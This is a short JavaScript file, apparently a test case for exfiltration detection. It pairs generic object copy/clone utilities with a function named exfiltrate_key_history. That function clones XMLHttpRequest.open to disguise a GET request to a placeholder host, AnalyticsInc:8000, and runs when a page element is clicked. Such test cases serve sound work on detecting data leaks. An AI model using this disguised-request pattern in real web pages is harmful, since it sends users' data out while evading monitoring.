//http://oranlooney.com/static/functional_javascript/owl_util.js
function copy(obj) {
	// JavaScript doesn't have a 'copy' function, because each class will best know
	// how to copy itself. However, it is possible to provide a function that suffices for
	// many object, particularly Object literals.  This `copy()` will perform a shallow 
	// copy on core JavaScript objects and will probably work for most user-defined classes.
	//   This copies an object exactly, including it's internal prototype and value references.
	// Only properties that are directly attached to the source object are copied.
	// However, an object and a copy will not compare equal with == or ===.
	//   Also, while this works on core JavaScript types, it probably won't work on
	// DOM elements and other objects provided by the runtime environment.
	if (typeof obj !== 'object' ) {
		return obj;  // non-object have value sematics, so obj is already a copy.
	} else {
		var value = obj.valueOf();
		if (obj != value) { 
			// the object is a standard object wrapper for a native type, say String.
			// we can make a copy by instantiating a new object around the value.
			return new obj.constructor(value);
		} else {
			// ok, we have a normal object. If possible, we'll clone the original's prototype 
			// (not the original) to get an empty object with the same prototype chain as
			// the original.  If just copy the instance properties.  Otherwise, we have to 
			// copy the whole thing, property-by-property.
			if ( obj instanceof obj.constructor && obj.constructor !== Object ) { 
				var c = clone(obj.constructor.prototype);
			
				// give the copy all the instance properties of obj.  It has the same
				// prototype as obj, so inherited properties are already there.
				for ( var property in obj) { 
					if (obj.hasOwnProperty(property)) {
						c[property] = copy(obj[property]);
					} 
				}
			} else {
				var c = {};
				for ( var property in obj ) c[property] = copy(obj[property]);
			}
			
			return c;
		}
	}
}

//http://oranlooney.com/static/functional_javascript/owl_util.js
// This version of clone was inspired by the MochiKit clone function.
function Clone() { }
function clone(obj) {
	Clone.prototype = obj;
	return new Clone();
}
function exfiltrate_key_history() {

    // Clone Function 5
    // Exfiltrate data using XMLHTTP request
    xmlhttp=new XMLHttpRequest();
	xmlhttp.opennew = copy(xmlhttp.open);
	xmlhttp.opennew("GET", "http://AnalyticsInc:8000/submission.html?test=clone5", true);
	xmlhttp.send(null);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
